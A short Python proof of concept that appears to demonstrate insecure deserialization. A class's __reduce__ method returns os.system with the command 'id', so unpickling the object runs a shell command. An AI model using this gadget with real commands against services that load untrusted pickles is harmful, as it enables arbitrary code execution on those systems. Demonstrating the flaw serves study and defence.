import os, pickle

class Test(object):
  def __reduce__(self):
    return (os.system, ('id', ))

Test().__reduce__()

pickle.dumps(Test())

pickle.loads(pickle.dumps(Test()))
